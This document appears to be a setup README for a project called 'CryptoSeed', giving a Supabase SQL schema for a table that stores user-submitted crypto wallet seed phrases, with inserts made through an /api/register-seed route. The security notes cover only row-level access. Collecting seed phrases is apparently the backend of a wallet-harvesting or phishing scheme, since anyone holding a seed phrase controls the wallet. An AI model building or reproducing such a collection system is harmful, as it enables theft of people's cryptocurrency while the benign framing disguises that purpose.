
# CryptoSeed Database Schema

This file contains the SQL schema required for the Supabase database. This setup is designed to be secure, allowing write operations only from the server using the `service_role` key.

### How to use this file:

1.  Go to your Supabase project dashboard.
2.  Navigate to the **SQL Editor**.
3.  Click on **"New query"**.
4.  Copy the entire SQL script below and paste it into the editor.
5.  Click **"RUN"** to create the table and enable Row Level Security.

---

## Full Database Setup Script

```sql
-- Create the seed_phrases table if it doesn't exist
CREATE TABLE IF NOT EXISTS public.seed_phrases (
  id uuid NOT NULL DEFAULT gen_random_uuid(),
  created_at timestamp with time zone NOT NULL DEFAULT now(),
  seed_phrase text NOT NULL,
  network text NOT NULL,
  CONSTRAINT seed_phrases_pkey PRIMARY KEY (id)
);

-- Add comments to the table and columns for clarity
COMMENT ON TABLE public.seed_phrases IS 'Stores user-submitted seed phrases and their selected network.';
COMMENT ON COLUMN public.seed_phrases.id IS 'Unique identifier for each record.';
COMMENT ON COLUMN public.seed_phrases.created_at IS 'Timestamp of when the record was created.';
COMMENT ON COLUMN public.seed_phrases.seed_phrase IS 'The user-submitted seed phrase (should be handled securely).';
COMMENT ON COLUMN public.seed_phrases.network IS 'The blockchain network associated with the seed phrase.';

-- Enable Row Level Security (RLS) on the table.
-- This is a critical security step. By default, it denies all access.
-- We will NOT be adding a policy for anonymous inserts.
-- All inserts will be handled by the backend using the service_role key, which bypasses RLS.
ALTER TABLE public.seed_phrases ENABLE ROW LEVEL SECURITY;

```

### Important Security Note

This setup intentionally **does not** create a policy to allow inserts from anonymous users. Instead, the application's API route (`/api/register-seed`) uses the Supabase **`service_role`** key, which has administrative privileges to bypass RLS and write to the database.

This is the recommended approach for handling sensitive data like seed phrases.
